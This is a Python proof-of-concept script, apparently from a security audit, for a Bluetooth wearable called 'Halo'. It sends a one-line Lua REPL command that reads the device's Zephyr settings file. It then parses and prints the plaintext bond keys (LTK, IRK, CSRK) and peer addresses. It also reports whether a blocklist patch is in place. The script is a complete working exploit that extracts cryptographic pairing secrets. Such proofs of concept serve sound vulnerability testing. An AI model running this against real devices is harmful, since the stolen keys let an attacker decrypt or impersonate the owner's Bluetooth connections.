# /// script
# requires-python = ">=3.10,<3.14"
# dependencies = ["brilliant-ble>=3.1.1,<4"]
# ///
"""
S-0005 PoC: exfiltrate /lfs/settings (plaintext bond keys) over the Lua REPL.

Any bonded host has REPL access by design. The Lua file API has no path
restriction, so a one-liner reads the Zephyr settings file chunk-wise and
print()s it (hex) over BLE notifications. Values are then parsed as the Zephyr
settings-file format (key=base64) and Halo bond blobs are decoded.

    uv run dump_settings.py --name "Halo"
"""
import argparse
import asyncio
import base64
import re
import sys

from brilliant_ble import BrilliantBle

# One-liner: dump settings as hex lines via REPL print(). Newline terminates
# device-side REPL commands, so this must stay one line.
DUMP_CMD = (
    "f=frame.file.open('settings','r');"
    "if f then while true do d=f:read(32) "
    "if d==nil or #d==0 then break end "
    "print((d:gsub('.',function(c) return string.format('%02x',c:byte()) end))) "
    "end f:close() print('EOF-OK') else print('OPEN-FAIL') end"
)

# Alif v1.2 gapc_pairing_keys_t layout; adjust if your header rev differs.
# valid_key_bf(1) pairing_lvl(1) pad? -> struct packing per gapc_sec.h:
#   ltk (gapc_ltk_t): key(16) rand(8) ediv(2) key_size(1)  = 27
#   irk (gapc_irk_t): key(16) identity(7)                  = 23
#   csrk(gap_sec_key_t): 16
# order: valid_key_bf, ltk, irk, csrk, pairing_lvl (verify against headers!)
OFF_VALID_BF = 0
OFF_LTK = 2
OFF_IRK = 2 + 27
OFF_CSRK = 2 + 27 + 23


def parse_settings(buf: bytes) -> dict[str, bytes]:
    """Zephyr settings-file format: <key>=<base64> lines."""
    out: dict[str, bytes] = {}
    for line in buf.split(b"\n"):
        if b"=" not in line:
            continue
        key, _, val = line.partition(b"=")
        try:
            out[key.decode(errors="replace").strip()] = base64.b64decode(val.strip())
        except Exception:
            pass
    return out


def show_bonds(entries: dict[str, bytes]) -> int:
    hits = 0
    for key in sorted(entries):
        if not re.search(r"bond\d+_(keys|addr)$", key):
            continue
        hits += 1
        blob = entries[key]
        print(f"[!] {key}: {len(blob)} bytes")
        if key.endswith("_addr") and len(blob) >= 7:
            addr = ":".join(f"{b:02X}" for b in blob[-6:])
            print(f"    peer identity addr: {addr}")
        if key.endswith("_keys") and len(blob) > OFF_CSRK + 16:
            ltk = blob[OFF_LTK:OFF_LTK + 16]
            irk = blob[OFF_IRK:OFF_IRK + 16]
            csrk = blob[OFF_CSRK:OFF_CSRK + 16]
            if any(ltk):
                print(f"    LTK : {ltk.hex()}")
            if any(irk):
                print(f"    IRK : {irk.hex()}")
            if any(csrk):
                print(f"    CSRK: {csrk.hex()}")
    return hits


async def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--name", default="Halo", help="BLE name prefix")
    ap.add_argument("--out", default="settings_dump.bin")
    args = ap.parse_args()

    halo = BrilliantBle()
    lines: list[str] = []
    try:
        name = await halo.connect(name=args.name)
        print(f"[+] Connected to {name}")
        await halo.send_break_signal()
        halo._user_print_response_handler = lines.append
        await halo.send_lua(DUMP_CMD, await_print=True)
        await asyncio.sleep(2)  # notifications are streamed per chunk
        await halo.send_reset_signal()
    finally:
        await halo.disconnect()

    if any("OPEN-FAIL" in line for line in lines):
        print("[+] cannot open 'settings' — blocklist in place. PATCHED.")
        return 0

    hexstr = "".join(
        line.strip() for line in lines
        if re.fullmatch(r"[0-9a-fA-F]+", line.strip())
    )
    if not hexstr:
        print(f"[-] no hex dump received. Raw lines: {lines[:10]}")
        return 2

    buf = bytes.fromhex(hexstr)
    with open(args.out, "wb") as f:
        f.write(buf)
    print(f"[+] settings file: {len(buf)} bytes -> {args.out}")

    entries = parse_settings(buf)
    print(f"[+] parsed {len(entries)} settings entries")
    hits = show_bonds(entries)
    if hits:
        print(f"[VULNERABLE] {hits} bond slots exfiltrated in plaintext "
              "(LTK/IRK/CSRK + peer addresses)")
        return 1
    print("[?] dump received but no bond keys recognized — ciphertext at rest? "
          "cross-check with btmon-captured LTK")
    return 0


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
